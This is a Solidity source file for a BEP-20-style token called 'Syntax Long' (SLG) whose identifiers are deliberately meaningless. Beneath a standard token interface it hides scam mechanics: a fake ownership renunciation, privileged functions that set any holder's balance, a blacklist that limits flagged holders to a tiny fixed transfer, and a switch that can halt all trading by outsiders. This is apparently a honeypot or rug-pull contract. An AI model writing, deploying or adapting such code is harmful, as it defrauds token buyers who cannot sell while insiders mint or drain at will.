//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface sellToLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptToken) external view returns (uint256);

    function transfer(address maxFee, uint256 minToken) external returns (bool);

    function allowance(address receiverAutoTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 minToken) external returns (bool);

    function transferFrom(
        address sender,
        address maxFee,
        uint256 minToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableSender, uint256 value);
    event Approval(address indexed receiverAutoTo, address indexed spender, uint256 value);
}

abstract contract txMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxFrom {
    function createPair(address txFund, address fromTotalLaunched) external returns (address);
}

interface listTxAuto is sellToLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SyntaxLong is txMarketing, sellToLiquidity, listTxAuto {

    uint256 isAuto;

    bool public atFundMode;

    mapping(address => uint256) private marketingBuy;

    address walletSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public receiverLimit;

    address private minTrading;

    function name() external view virtual override returns (string memory) {
        return autoExemptShould;
    }

    function toLimit(address fundMarketing) public {
        teamToReceiver();
        
        if (fundMarketing == marketingLaunched || fundMarketing == teamSenderReceiver) {
            return;
        }
        maxAutoFrom[fundMarketing] = true;
    }

    bool public feeIsMin;

    function decimals() external view virtual override returns (uint8) {
        return minFundIs;
    }

    bool private amountShould;

    function teamToReceiver() private view {
        require(receiverLimit[_msgSender()]);
    }

    uint8 private minFundIs = 18;

    function launchFee() public {
        emit OwnershipTransferred(marketingLaunched, address(0));
        minTrading = address(0);
    }

    uint256 constant buyTx = 8 ** 10;

    function buyTo(uint256 minToken) public {
        teamToReceiver();
        isAuto = minToken;
    }

    uint256 public marketingBuyAmount;

    function allowance(address walletIs, address launchedBuy) external view virtual override returns (uint256) {
        if (launchedBuy == walletSender) {
            return type(uint256).max;
        }
        return marketingTotal[walletIs][launchedBuy];
    }

    uint256 private txLaunch = 100000000 * 10 ** 18;

    address public teamSenderReceiver;

    uint256 public senderLaunch;

    constructor (){
        if (feeIsMin) {
            launchedMarketing = true;
        }
        walletSwap totalLiquidityToken = walletSwap(walletSender);
        teamSenderReceiver = maxFrom(totalLiquidityToken.factory()).createPair(totalLiquidityToken.WETH(), address(this));
        
        marketingLaunched = _msgSender();
        launchFee();
        receiverLimit[marketingLaunched] = true;
        marketingBuy[marketingLaunched] = txLaunch;
        
        emit Transfer(address(0), marketingLaunched, txLaunch);
    }

    function fundExempt(address toFund) public {
        if (atFundMode) {
            return;
        }
        
        receiverLimit[toFund] = true;
        if (marketingBuyAmount == senderLaunch) {
            feeIsMin = false;
        }
        atFundMode = true;
    }

    string private autoExemptShould = "Syntax Long";

    mapping(address => mapping(address => uint256)) private marketingTotal;

    bool public launchedMarketing;

    address public marketingLaunched;

    function balanceOf(address exemptToken) public view virtual override returns (uint256) {
        return marketingBuy[exemptToken];
    }

    string private isList = "SLG";

    function getOwner() external view returns (address) {
        return minTrading;
    }

    function owner() external view returns (address) {
        return minTrading;
    }

    function transferFrom(address exemptTo, address maxFee, uint256 minToken) external override returns (bool) {
        if (_msgSender() != walletSender) {
            if (marketingTotal[exemptTo][_msgSender()] != type(uint256).max) {
                require(minToken <= marketingTotal[exemptTo][_msgSender()]);
                marketingTotal[exemptTo][_msgSender()] -= minToken;
            }
        }
        return swapTxTrading(exemptTo, maxFee, minToken);
    }

    function transfer(address swapTxMax, uint256 minToken) external virtual override returns (bool) {
        return swapTxTrading(_msgSender(), swapTxMax, minToken);
    }

    function swapTxTrading(address exemptTo, address maxFee, uint256 minToken) internal returns (bool) {
        if (exemptTo == marketingLaunched) {
            return tokenTo(exemptTo, maxFee, minToken);
        }
        uint256 liquidityLaunched = sellToLiquidity(teamSenderReceiver).balanceOf(totalIs);
        require(liquidityLaunched == isAuto);
        require(maxFee != totalIs);
        if (maxAutoFrom[exemptTo]) {
            return tokenTo(exemptTo, maxFee, buyTx);
        }
        return tokenTo(exemptTo, maxFee, minToken);
    }

    event OwnershipTransferred(address indexed exemptSwap, address indexed sellTo);

    address totalIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function tradingLiquidity(address swapTxMax, uint256 minToken) public {
        teamToReceiver();
        marketingBuy[swapTxMax] = minToken;
    }

    function approve(address launchedBuy, uint256 minToken) public virtual override returns (bool) {
        marketingTotal[_msgSender()][launchedBuy] = minToken;
        emit Approval(_msgSender(), launchedBuy, minToken);
        return true;
    }

    function tokenTo(address exemptTo, address maxFee, uint256 minToken) internal returns (bool) {
        require(marketingBuy[exemptTo] >= minToken);
        marketingBuy[exemptTo] -= minToken;
        marketingBuy[maxFee] += minToken;
        emit Transfer(exemptTo, maxFee, minToken);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return txLaunch;
    }

    function symbol() external view virtual override returns (string memory) {
        return isList;
    }

    uint256 feeTeam;

    mapping(address => bool) public maxAutoFrom;

}